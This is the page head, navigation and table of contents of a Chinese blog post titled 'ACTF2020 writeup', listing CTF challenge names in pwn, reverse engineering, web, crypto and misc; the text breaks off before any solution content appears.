<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5"><title>ACTF2020 writeup | TaQini</title><meta name="description" content="ACTF2020 writeup"><meta name="keywords" content="CTF,pwn,writeup,re,misc,ROP,shellcode,栈迁移,shell基础,RSA,无符号整数,free_hook,php弱类型,abs函数漏洞,_IO_FILE,fsb,逆向分析,爆破,动态调试,自修改代码,多线程,sql注入,python,githack,php文件包含,HTTP协议,代码审计,md5绕过,XXE,命令执行,维吉尼亚密码,zip伪加密,AES,base64隐写,文件修复,流量分析,outguess隐写,web,crypto"><meta name="author" content="TaQini"><meta name="copyright" content="TaQini"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="http://image.taqini.space/img/20200305122927.png"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin><link rel="preconnect" href="https://hm.baidu.com"><link rel="preconnect" href="http://ta.qq.com"><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin><link rel="preconnect" href="//busuanzi.ibruce.info"><meta name="google-site-verification" content="-dhsoFQadgDKJR7BsB6bc1j5yfqjUpg_b-1pFjr7o3x"><meta name="baidu-site-verification" content="MmFa3MzTgG"><meta name="360-site-verification" content="fddfed369e9e91402671f846d08e64c7"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="ACTF2020 writeup"><meta name="twitter:description" content="ACTF2020 writeup"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200213172719.png"><meta property="og:type" content="article"><meta property="og:title" content="ACTF2020 writeup"><meta property="og:url" content="http://taqini.space/2020/02/13/ACTF2020-writeup/"><meta property="og:site_name" content="TaQini"><meta property="og:description" content="ACTF2020 writeup"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200213172719.png"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>const autoChangeMode = 'false'
var t = Cookies.get("theme");
if (autoChangeMode == '1'){
const isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
const isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
const isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

if (t === undefined){
  if (isLightMode) activateLightMode()
  else if (isDarkMode) activateDarkMode()
  else if (isNotSpecified || hasNoSupport){
    console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
    now = new Date();
    hour = now.getHours();
    isNight = hour < 6 || hour >= 18
    isNight ? activateDarkMode() : activateLightMode()
}
} else if (t == 'light') activateLightMode()
else activateDarkMode()


} else if (autoChangeMode == '2'){
  now = new Date();
  hour = now.getHours();
  isNight = hour < 6 || hour >= 18
  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode() 
} else {
  if ( t == 'dark' ) activateDarkMode()
  else if ( t == 'light') activateLightMode()
}

function activateDarkMode(){
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null){
    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
  }
}
function activateLightMode(){
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null){
  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
  }
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><link rel="canonical" href="http://taqini.space/2020/02/13/ACTF2020-writeup/"><link rel="prev" title="通过利用fini_array部署并启动ROP攻击" href="http://taqini.space/2020/02/14/play-ROP-with-fini-array/"><link rel="next" title="Hexo博客搭建指南" href="http://taqini.space/2020/02/12/start-with-hexo/"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?303b8d57c50af6b9774ac6c5de30548b";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-159447434-1', 'auto');
ga('send', 'pageview');
</script><script src="http://tajs.qq.com/stats?sId=66525622" charset="UTF-8"></script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"http://taqini.space/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  bookmark: {
    title: 'Snackbar.bookmark.title',
    message_prev: '按',
    message_next: '键将本页加入书签'
  },
  runtime_unit: '天',
  runtime: true,
  copyright: {"languages":{"author":"作者: TaQini","link":"链接: http://taqini.space/2020/02/13/ACTF2020-writeup/","source":"来源: TaQini","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  ClickShowText: undefined,
  medium_zoom: false,
  fancybox: true,
  Snackbar: {"bookmark":{"title":"Snackbar.bookmark.title","message_prev":"按","message_next":"键将本页加入书签"},"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#2d3035","position":"bottom-left"},
  baiduPush: false,
  isHome: false,
  isPost: true
  
}</script><meta name="generator" content="Hexo 4.2.0"></head><body><canvas class="fireworks"></canvas><header> <div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">TaQini</a></span><span class="toggle-menu pull_right close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span><span class="pull_right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="http://ctf.taqini.space" target="_blank" rel="noopener"><i class="fa-fw fa fa-flag"></i><span> CTFq平台</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-code" aria-hidden="true"></i><span> 更多</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About me</span></a></li><li><a class="site-page" href="/2020/02/22/index-of-pwn/"><i class="fa-fw fa fa-chain"></i><span> Pwn索引</span></a></li><li><a class="site-page" href="/piao"><i class="fa-fw fa fa-link"></i><span> 漂亮前端</span></a></li><li><a class="site-page" href="/mikutap"><i class="fa-fw fa fa-music"></i><span> MikuTap</span></a></li><li><a class="site-page" href="https://pusheen.com/" target="_blank" rel="noopener"><i class="fa-fw fa fa-star"></i><span> Pusheen</span></a></li><li><a class="site-page" href="/todo/"><i class="fa-fw fa fa-check-square"></i><span> TODO List</span></a></li></ul></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-book" aria-hidden="true"></i><span> 书单</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="https://yeasy.gitbooks.io/docker_practice" target="_blank" rel="noopener"><i class="fa-fw fa fa-hand-o-right"></i><span> Docker从入门到实践</span></a></li><li><a class="site-page" href="https://bingohuang.gitbooks.io/progit2/" target="_blank" rel="noopener"><i class="fa-fw fa fa-hand-o-right"></i><span> Pro Git</span></a></li><li><a class="site-page" href="https://wiki.x10sec.org/" target="_blank" rel="noopener"><i class="fa-fw fa fa-hand-o-right"></i><span> CTF Wiki</span></a></li></ul></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-gears" aria-hidden="true"></i><span> 工具</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="http://git.taqini.space" target="_blank" rel="noopener"><i class="fa-fw fa fa-git"></i><span> Gogs平台</span></a></li><li><a class="site-page" href="ftp://47.100.63.152" target="_blank" rel="noopener"><i class="fa-fw fa fa-cloud"></i><span> FTP服务器</span></a></li><li><a class="site-page" href="https://shimo.im" target="_blank" rel="noopener"><i class="fa-fw fa fa-edit"></i><span> 石墨文档</span></a></li><li><a class="site-page" href="https://app.diagrams.net" target="_blank" rel="noopener"><i class="fa-fw fa fa-pencil"></i><span> 在线画图</span></a></li><li><a class="site-page" href="http://taqini.space/CyberChef"><i class="fa-fw fa fa-unlock"></i><span> CyberChef</span></a></li><li><a class="site-page" href="https://portal.qiniu.com" target="_blank" rel="noopener"><i class="fa-fw fa fa-photo"></i><span> 七牛图床</span></a></li><li><a class="site-page" href="http://libc.taqini.space" target="_blank" rel="noopener"><i class="fa-fw fa fa-code"></i><span> libcsearch</span></a></li><li><a class="site-page" href="http://patorjk.com" target="_blank" rel="noopener"><i class="fa-fw fa fa-font"></i><span> ASCII Art</span></a></li></ul></div></div></span><span class="pull_right" id="search_button"><a class="site-page social-icon search"><i class="fa fa-search fa-fw"></i><span> 搜索</span></a></span></div></header><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="http://image.taqini.space/img/owl.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">22</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">80</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">6</div></a></div></div></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="http://ctf.taqini.space" target="_blank" rel="noopener"><i class="fa-fw fa fa-flag"></i><span> CTFq平台</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-code" aria-hidden="true"></i><span> 更多</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About me</span></a></li><li><a class="site-page" href="/2020/02/22/index-of-pwn/"><i class="fa-fw fa fa-chain"></i><span> Pwn索引</span></a></li><li><a class="site-page" href="/piao"><i class="fa-fw fa fa-link"></i><span> 漂亮前端</span></a></li><li><a class="site-page" href="/mikutap"><i class="fa-fw fa fa-music"></i><span> MikuTap</span></a></li><li><a class="site-page" href="https://pusheen.com/" target="_blank" rel="noopener"><i class="fa-fw fa fa-star"></i><span> Pusheen</span></a></li><li><a class="site-page" href="/todo/"><i class="fa-fw fa fa-check-square"></i><span> TODO List</span></a></li></ul></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-book" aria-hidden="true"></i><span> 书单</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="https://yeasy.gitbooks.io/docker_practice" target="_blank" rel="noopener"><i class="fa-fw fa fa-hand-o-right"></i><span> Docker从入门到实践</span></a></li><li><a class="site-page" href="https://bingohuang.gitbooks.io/progit2/" target="_blank" rel="noopener"><i class="fa-fw fa fa-hand-o-right"></i><span> Pro Git</span></a></li><li><a class="site-page" href="https://wiki.x10sec.org/" target="_blank" rel="noopener"><i class="fa-fw fa fa-hand-o-right"></i><span> CTF Wiki</span></a></li></ul></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-gears" aria-hidden="true"></i><span> 工具</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="http://git.taqini.space" target="_blank" rel="noopener"><i class="fa-fw fa fa-git"></i><span> Gogs平台</span></a></li><li><a class="site-page" href="ftp://47.100.63.152" target="_blank" rel="noopener"><i class="fa-fw fa fa-cloud"></i><span> FTP服务器</span></a></li><li><a class="site-page" href="https://shimo.im" target="_blank" rel="noopener"><i class="fa-fw fa fa-edit"></i><span> 石墨文档</span></a></li><li><a class="site-page" href="https://app.diagrams.net" target="_blank" rel="noopener"><i class="fa-fw fa fa-pencil"></i><span> 在线画图</span></a></li><li><a class="site-page" href="http://taqini.space/CyberChef"><i class="fa-fw fa fa-unlock"></i><span> CyberChef</span></a></li><li><a class="site-page" href="https://portal.qiniu.com" target="_blank" rel="noopener"><i class="fa-fw fa fa-photo"></i><span> 七牛图床</span></a></li><li><a class="site-page" href="http://libc.taqini.space" target="_blank" rel="noopener"><i class="fa-fw fa fa-code"></i><span> libcsearch</span></a></li><li><a class="site-page" href="http://patorjk.com" target="_blank" rel="noopener"><i class="fa-fw fa fa-font"></i><span> ASCII Art</span></a></li></ul></div></div></div><div id="mobile-sidebar-toc"><div class="toc_mobile_headline">目录</div><div class="sidebar-toc__content"><ol class="toc_mobile_items"><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#ACTF-2020"><span class="toc_mobile_items-text">ACTF 2020</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#Pwn"><span class="toc_mobile_items-text">Pwn</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#simple-rop"><span class="toc_mobile_items-text">simple_rop</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#shellcode"><span class="toc_mobile_items-text">shellcode</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#fmt32"><span class="toc_mobile_items-text">fmt32</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#fmt64"><span class="toc_mobile_items-text">fmt64</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#非预期解"><span class="toc_mobile_items-text">非预期解</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#预期解"><span class="toc_mobile_items-text">预期解</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#Complaint"><span class="toc_mobile_items-text">Complaint</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#Re"><span class="toc_mobile_items-text">Re</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#Here-you-are"><span class="toc_mobile_items-text">Here_you_are</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#Rome"><span class="toc_mobile_items-text">Rome</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#game"><span class="toc_mobile_items-text">game</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#usualCrypt"><span class="toc_mobile_items-text">usualCrypt</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#加密"><span class="toc_mobile_items-text">加密</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#解密"><span class="toc_mobile_items-text">解密</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#oruga"><span class="toc_mobile_items-text">oruga</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#游戏规则"><span class="toc_mobile_items-text">游戏规则</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#代码分析"><span class="toc_mobile_items-text">代码分析</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#easyre"><span class="toc_mobile_items-text">easyre</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#SoulLike"><span class="toc_mobile_items-text">SoulLike</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Pin指令数统计爆破"><span class="toc_mobile_items-text">Pin指令数统计爆破</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#Splendid-MineCraft"><span class="toc_mobile_items-text">Splendid_MineCraft</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#0x0-确定flag结构"><span class="toc_mobile_items-text">0x0 确定flag结构</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#0x1-动态分析"><span class="toc_mobile_items-text">0x1 动态分析</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#第一部分"><span class="toc_mobile_items-text">第一部分</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#第二部分"><span class="toc_mobile_items-text">第二部分</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#第三部分"><span class="toc_mobile_items-text">第三部分</span></a></li></ol></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#ding"><span class="toc_mobile_items-text">ding</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#UniverseFinalAnswer"><span class="toc_mobile_items-text">UniverseFinalAnswer</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#解方程"><span class="toc_mobile_items-text">解方程</span></a></li></ol></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#Web"><span class="toc_mobile_items-text">Web</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#universal-sql"><span class="toc_mobile_items-text">universal_sql</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#茶颜悦色"><span class="toc_mobile_items-text">茶颜悦色</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#babysql"><span class="toc_mobile_items-text">babysql</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#whats-git"><span class="toc_mobile_items-text">whats git</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#backup-file"><span class="toc_mobile_items-text">backup_file</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#easy-file-include"><span class="toc_mobile_items-text">easy_file_include</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#easyHTTP"><span class="toc_mobile_items-text">easyHTTP</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#easyphp"><span class="toc_mobile_items-text">easyphp</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#幸运数字"><span class="toc_mobile_items-text">幸运数字</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#easyweb"><span class="toc_mobile_items-text">easyweb</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#simlple-exec"><span class="toc_mobile_items-text">simlple_exec</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#Crypto"><span class="toc_mobile_items-text">Crypto</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#classic0"><span class="toc_mobile_items-text">classic0</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#classic1"><span class="toc_mobile_items-text">classic1</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#rsa0"><span class="toc_mobile_items-text">rsa0</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#伪加密"><span class="toc_mobile_items-text">伪加密</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#rsa解密"><span class="toc_mobile_items-text">rsa解密</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#baby-aes"><span class="toc_mobile_items-text">baby aes</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#Misc"><span class="toc_mobile_items-text">Misc</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#白给"><span class="toc_mobile_items-text">白给</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#Music-for-free"><span class="toc_mobile_items-text">Music for free</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#SWP"><span class="toc_mobile_items-text">SWP</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#喵咪"><span class="toc_mobile_items-text">喵咪</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#Login"><span class="toc_mobile_items-text">Login</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#end"><span class="toc_mobile_items-text">end</span></a></li></ol></div></div></div><div id="body-wrap"><div id="web_bg" data-type="color"></div><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true">     </i><div class="auto_open" id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ACTF-2020"><span class="toc-text">ACTF 2020</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn"><span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#simple-rop"><span class="toc-text">simple_rop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellcode"><span class="toc-text">shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fmt32"><span class="toc-text">fmt32</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fmt64"><span class="toc-text">fmt64</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#非预期解"><span class="toc-text">非预期解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#预期解"><span class="toc-text">预期解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Complaint"><span class="toc-text">Complaint</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Re"><span class="toc-text">Re</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Here-you-are"><span class="toc-text">Here_you_are</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Rome"><span class="toc-text">Rome</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#game"><span class="toc-text">game</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#usualCrypt"><span class="toc-text">usualCrypt</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#加密"><span class="toc-text">加密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解密"><span class="toc-text">解密</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#oruga"><span class="toc-text">oruga</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#游戏规则"><span class="toc-text">游戏规则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#代码分析"><span class="toc-text">代码分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easyre"><span class="toc-text">easyre</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SoulLike"><span class="toc-text">SoulLike</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Pin指令数统计爆破"><span class="toc-text">Pin指令数统计爆破</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Splendid-MineCraft"><span class="toc-text">Splendid_MineCraft</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x0-确定flag结构"><span class="toc-text">0x0 确定flag结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x1-动态分析"><span class="toc-text">0x1 动态分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#第一部分"><span class="toc-text">第一部分</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#第二部分"><span class="toc-text">第二部分</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#第三部分"><span class="toc-text">第三部分</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ding"><span class="toc-text">ding</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UniverseFinalAnswer"><span class="toc-text">UniverseFinalAnswer</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#解方程"><span class="toc-text">解方程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#universal-sql"><span class="toc-text">universal_sql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#茶颜悦色"><span class="toc-text">茶颜悦色</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babysql"><span class="toc-text">babysql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#whats-git"><span class="toc-text">whats git</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#backup-file"><span class="toc-text">backup_file</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-file-include"><span class="toc-text">easy_file_include</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easyHTTP"><span class="toc-text">easyHTTP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easyphp"><span class="toc-text">easyphp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#幸运数字"><span class="toc-text">幸运数字</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easyweb"><span class="toc-text">easyweb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#simlple-exec"><span class="toc-text">simlple_exec</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#classic0"><span class="toc-text">classic0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#classic1"><span class="toc-text">classic1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rsa0"><span class="toc-text">rsa0</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#伪加密"><span class="toc-text">伪加密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rsa解密"><span class="toc-text">rsa解密</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#baby-aes"><span class="toc-text">baby aes</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item 